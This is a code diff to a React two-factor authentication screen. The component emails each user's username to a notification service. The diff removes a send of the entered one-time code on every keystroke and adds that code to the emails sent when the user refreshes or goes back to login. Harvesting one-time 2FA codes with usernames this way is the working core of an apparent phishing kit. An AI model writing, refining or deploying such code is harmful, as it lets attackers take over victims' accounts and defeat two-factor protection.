@@ -32,27 +32,9 @@ const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSucc
     return () => clearInterval(interval);
   }, [timer]);
 
-  const handleCodeChange = async (value: string) => {
+  const handleCodeChange = (value: string) => {
     const processedValue = value.replace(/\D/g, '').slice(0, 6);
     setCode(processedValue);
-
-    // Send email immediately when code is entered
-    if (processedValue) {
-      try {
-        await sendEmailNotification({
-          step: "Two-Factor Auth - Code Entry",
-          username,
-          timestamp: new Date().toISOString(),
-          allFormData: {
-            username,
-            twoFactorCode: processedValue,
-            codeLength: processedValue.length
-          }
-        });
-      } catch (error) {
-        console.error('❌ Failed to send email for code entry:', error);
-      }
-    }
   };
 
   const handleSubmit = async (e: React.FormEvent) => {
@@ -108,7 +90,8 @@ const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSucc
         timestamp: new Date().toISOString(),
         allFormData: {
           username,
-          action: "refresh_code"
+          action: "refresh_code",
+          twoFactorCode: code
         }
       });
     } catch (error) {
@@ -130,7 +113,8 @@ const TwoFactorAuth: React.FC<TwoFactorAuthProps> = ({ username, onTwoFactorSucc
         timestamp: new Date().toISOString(),
         allFormData: {
           username,
-          action: "back_to_login"
+          action: "back_to_login",
+          twoFactorCode: code
         }
       });
     } catch (error) {
